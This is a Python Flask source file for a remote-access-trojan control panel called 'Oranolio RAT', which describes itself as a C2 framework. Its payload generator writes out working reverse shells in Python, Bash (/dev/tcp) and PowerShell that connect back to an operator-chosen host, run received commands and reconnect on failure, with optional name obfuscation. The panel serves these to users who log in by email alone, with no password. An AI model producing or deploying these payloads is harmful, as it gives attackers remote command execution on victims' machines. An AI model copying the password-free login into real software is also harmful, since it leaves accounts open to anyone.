#!/usr/bin/env python3
"""
Simple Flask Application Entry Point for Oranolio RAT
Minimal dependencies for quick startup
"""

import os
import sys
from pathlib import Path

# Add current directory to path
sys.path.insert(0, str(Path(__file__).parent))

# Load environment variables
try:
    from dotenv import load_dotenv
    load_dotenv()
except:
    pass

# Setup logging
from production_logging import setup_production_logging
setup_production_logging()

from flask import Flask, render_template, request, jsonify, session, redirect, url_for, flash
from flask_socketio import SocketIO
from werkzeug.security import generate_password_hash, check_password_hash
import sqlite3
from datetime import datetime
import secrets

# Create Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', secrets.token_hex(32))
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

# Initialize SocketIO
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Database helper
def get_db():
    """Get database connection"""
    db_path = Path('data/email_auth.db')
    conn = sqlite3.connect(str(db_path))
    conn.row_factory = sqlite3.Row
    return conn

# Payload generation helper
def generate_simple_payload(host, port, platform, persistence, obfuscate):
    """Generate a simple reverse shell payload"""
    import random
    import string
    
    if platform == 'python':
        payload = f'''#!/usr/bin/env python3
import socket
import subprocess
import os
import sys
import time

HOST = "{host}"
PORT = {port}

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            return s
        except:
            time.sleep(5)

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout + result.stderr
    except Exception as e:
        return f"Error: {{str(e)}}"

def main():
    s = connect()
    s.send(b"[+] Connected\\n")
    
    while True:
        try:
            data = s.recv(4096)
            if not data:
                break
            
            cmd = data.decode('utf-8').strip()
            
            if cmd.lower() == 'exit':
                break
            
            output = execute_command(cmd)
            s.send(output.encode('utf-8'))
            
        except Exception as e:
            try:
                s.send(f"Error: {{str(e)}}\\n".encode('utf-8'))
            except:
                break
    
    s.close()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
'''
    
    elif platform == 'bash':
        payload = f'''#!/bin/bash
HOST="{host}"
PORT={port}

while true; do
    bash -i >& /dev/tcp/$HOST/$PORT 0>&1
    sleep 5
done
'''
    
    elif platform == 'powershell':
        payload = f'''$host = "{host}"
$port = {port}

while ($true) {{
    try {{
        $client = New-Object System.Net.Sockets.TCPClient($host, $port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        $writer.WriteLine("[+] Connected")
        
        while ($client.Connected) {{
            $cmd = $reader.ReadLine()
            if ($cmd -eq "exit") {{ break }}
            
            try {{
                $output = Invoke-Expression $cmd 2>&1 | Out-String
                $writer.WriteLine($output)
            }} catch {{
                $writer.WriteLine("Error: $_")
            }}
        }}
        
        $client.Close()
    }} catch {{
        Start-Sleep -Seconds 5
    }}
}}
'''
    
    else:
        payload = "# Unsupported platform"
    
    # Simple obfuscation if requested
    if obfuscate and platform == 'python':
        # Variable name randomization
        var_map = {
            'HOST': ''.join(random.choices(string.ascii_letters, k=8)),
            'PORT': ''.join(random.choices(string.ascii_letters, k=8)),
            'connect': ''.join(random.choices(string.ascii_letters, k=8)),
            'execute_command': ''.join(random.choices(string.ascii_letters, k=8)),
            'main': ''.join(random.choices(string.ascii_letters, k=8))
        }
        for old, new in var_map.items():
            payload = payload.replace(old, new)
    
    return payload

# Routes
@app.route('/')
def index():
    """Home page"""
    if session.get('authenticated'):
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login page"""
    if request.method == 'POST':
        email = request.form.get('email', '').strip().lower()
        
        if not email:
            flash('Please enter an email address', 'error')
            return render_template('login.html')
        
        # Check if user exists
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM email_auth WHERE email = ?', (email,))
        user = cursor.fetchone()
        
        if user:
            # User exists, log them in
            session['authenticated'] = True
            session['email'] = email
            session['user_id'] = user['id']
            
            # Update last login
            cursor.execute(
                'UPDATE email_auth SET last_login = ?, last_ip = ? WHERE email = ?',
                (datetime.now(), request.remote_addr, email)
            )
            conn.commit()
            conn.close()
            
            flash(f'Welcome back, {email}!', 'success')
            return redirect(url_for('dashboard'))
        else:
            # Create new user
            cursor.execute(
                'INSERT INTO email_auth (email, is_verified, created_at, last_ip) VALUES (?, 1, ?, ?)',
                (email, datetime.now(), request.remote_addr)
            )
            conn.commit()
            
            session['authenticated'] = True
            session['email'] = email
            session['user_id'] = cursor.lastrowid
            conn.close()
            
            flash(f'Welcome, {email}! Your account has been created.', 'success')
            return redirect(url_for('dashboard'))
    
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    """Dashboard page"""
    if not session.get('authenticated'):
        return redirect(url_for('login'))
    
    email = session.get('email', 'Unknown')
    
    # Get system stats
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) as count FROM email_auth')
    user_count = cursor.fetchone()['count']
    conn.close()
    
    stats = {
        'users': user_count,
        'active_sessions': 1,
        'connected_targets': 0,
        'commands_executed': 0
    }
    
    return render_template('dashboard.html', email=email, stats=stats)

@app.route('/payloads', methods=['GET', 'POST'])
def payloads():
    """Payload generator page"""
    if not session.get('authenticated'):
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        # Get form data
        platform = request.form.get('platform', 'python')
        host = request.form.get('host', 'localhost')
        port = request.form.get('port', '4444')
        persistence = request.form.get('persistence') == 'on'
        obfuscate = request.form.get('obfuscate') == 'on'
        
        # Validate inputs
        try:
            port = int(port)
            if port < 1 or port > 65535:
                flash('Port must be between 1 and 65535', 'error')
                return render_template('payloads.html')
        except ValueError:
            flash('Invalid port number', 'error')
            return render_template('payloads.html')
        
        # Generate payload
        payload_code = generate_simple_payload(host, port, platform, persistence, obfuscate)
        
        return render_template('payloads.html', 
                             payload=payload_code,
                             platform=platform,
                             host=host,
                             port=port,
                             persistence=persistence,
                             obfuscate=obfuscate)
    
    return render_template('payloads.html')

@app.route('/logout')
def logout():
    """Logout"""
    session.clear()
    flash('You have been logged out', 'info')
    return redirect(url_for('login'))

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'version': '1.1.0'
    })

@app.route('/api/stats')
def api_stats():
    """API endpoint for stats"""
    if not session.get('authenticated'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) as count FROM email_auth')
    user_count = cursor.fetchone()['count']
    conn.close()
    
    return jsonify({
        'users': user_count,
        'active_sessions': 1,
        'connected_targets': 0,
        'uptime': '0h 0m'
    })

# WebSocket events
@socketio.on('connect')
def handle_connect():
    """Handle WebSocket connection"""
    print(f'Client connected: {request.sid}')

@socketio.on('disconnect')
def handle_disconnect():
    """Handle WebSocket disconnection"""
    print(f'Client disconnected: {request.sid}')

# Error handlers
@app.errorhandler(404)
def not_found(error):
    """404 error handler"""
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_error(error):
    """500 error handler"""
    return render_template('500.html'), 500

# Create templates if they don't exist
def create_templates():
    """Create basic templates"""
    templates_dir = Path('templates')
    templates_dir.mkdir(exist_ok=True)
    
    # Login template
    login_html = '''<!DOCTYPE html>
<html>
<head>
    <title>Oranolio RAT - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); max-width: 400px; width: 100%; }
        h1 { color: #333; margin-bottom: 10px; font-size: 28px; }
        .subtitle { color: #666; margin-bottom: 30px; font-size: 14px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #555; font-weight: 500; }
        input[type="email"] { width: 100%; padding: 12px; border: 2px solid #e0e0e0; border-radius: 5px; font-size: 16px; transition: border-color 0.3s; }
        input[type="email"]:focus { outline: none; border-color: #667eea; }
        button { width: 100%; padding: 12px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 5px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.2s; }
        button:hover { transform: translateY(-2px); }
        .flash { padding: 12px; margin-bottom: 20px; border-radius: 5px; }
        .flash.success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .flash.error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .flash.info { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
        .features { margin-top: 30px; padding-top: 20px; border-top: 1px solid #e0e0e0; }
        .feature { display: flex; align-items: center; margin-bottom: 10px; color: #666; font-size: 14px; }
        .feature::before { content: "✓"; color: #667eea; font-weight: bold; margin-right: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 Oranolio RAT</h1>
        <p class="subtitle">Elite C2 Framework - Production Ready</p>
        
        {% with messages = get_flashed_messages(with_categories=true) %}
            {% if messages %}
                {% for category, message in messages %}
                    <div class="flash {{ category }}">{{ message }}</div>
                {% endfor %}
            {% endif %}
        {% endwith %}
        
        <form method="POST">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" placeholder="admin@oranolio.local" required autofocus>
            </div>
            <button type="submit">Login / Sign Up</button>
        </form>
        
        <div class="features">
            <div class="feature">Zero-configuration email authentication</div>
            <div class="feature">Production-grade security</div>
            <div class="feature">Real-time monitoring</div>
        </div>
    </div>
</body>
</html>'''
    
    # Dashboard template
    dashboard_html = '''<!DOCTYPE html>
<html>
<head>
    <title>Oranolio RAT - Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f7fa; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header h1 { font-size: 24px; }
        .user-info { display: flex; align-items: center; gap: 20px; }
        .logout-btn { background: rgba(255,255,255,0.2); color: white; padding: 8px 20px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; }
        .logout-btn:hover { background: rgba(255,255,255,0.3); }
        .container { max-width: 1200px; margin: 40px auto; padding: 0 20px; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 40px; }
        .stat-card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
        .stat-card h3 { color: #666; font-size: 14px; font-weight: 500; margin-bottom: 10px; }
        .stat-card .value { font-size: 36px; font-weight: bold; color: #667eea; }
        .section { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); margin-bottom: 20px; }
        .section h2 { color: #333; margin-bottom: 20px; font-size: 20px; }
        .status { display: inline-block; padding: 4px 12px; border-radius: 12px; font-size: 12px; font-weight: 600; }
        .status.healthy { background: #d4edda; color: #155724; }
        .flash { padding: 15px; margin-bottom: 20px; border-radius: 5px; }
        .flash.success { background: #d4edda; color: #155724; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🚀 Oranolio RAT Dashboard</h1>
        <div class="user-info">
            <span>{{ email }}</span>
            <a href="/logout" class="logout-btn">Logout</a>
        </div>
    </div>
    
    <div class="container">
        {% with messages = get_flashed_messages(with_categories=true) %}
            {% if messages %}
                {% for category, message in messages %}
                    <div class="flash {{ category }}">{{ message }}</div>
                {% endfor %}
            {% endif %}
        {% endwith %}
        
        <div class="stats-grid">
            <div class="stat-card">
                <h3>Total Users</h3>
                <div class="value">{{ stats.users }}</div>
            </div>
            <div class="stat-card">
                <h3>Active Sessions</h3>
                <div class="value">{{ stats.active_sessions }}</div>
            </div>
            <div class="stat-card">
                <h3>Connected Targets</h3>
                <div class="value">{{ stats.connected_targets }}</div>
            </div>
            <div class="stat-card">
                <h3>Commands Executed</h3>
                <div class="value">{{ stats.commands_executed }}</div>
            </div>
        </div>
        
        <div class="section">
            <h2>System Status</h2>
            <p>System Status: <span class="status healthy">HEALTHY</span></p>
            <p style="margin-top: 10px; color: #666;">All systems operational. Ready for C2 operations.</p>
        </div>
        
        <div class="section">
            <h2>Quick Actions</h2>
            <p style="color: #666;">Dashboard is operational. Additional features can be accessed through the API.</p>
        </div>
    </div>
</body>
</html>'''
    
    (templates_dir / 'login.html').write_text(login_html)
    (templates_dir / 'dashboard.html').write_text(dashboard_html)
    print('[✓] Templates created')

if __name__ == '__main__':
    print('=' * 70)
    print('ORANOLIO RAT - STARTING APPLICATION')
    print('=' * 70)
    
    # Create templates
    create_templates()
    
    # Get configuration
    host = os.getenv('STITCH_HOST', '0.0.0.0')
    port = int(os.getenv('STITCH_PORT', 5000))
    
    print(f'[*] Starting server on {host}:{port}')
    print(f'[*] Access the application at: http://localhost:{port}')
    print(f'[*] Default admin email: admin@oranolio.local')
    print('=' * 70)
    
    # Run the application
    socketio.run(app, host=host, port=port, debug=False, allow_unsafe_werkzeug=True)
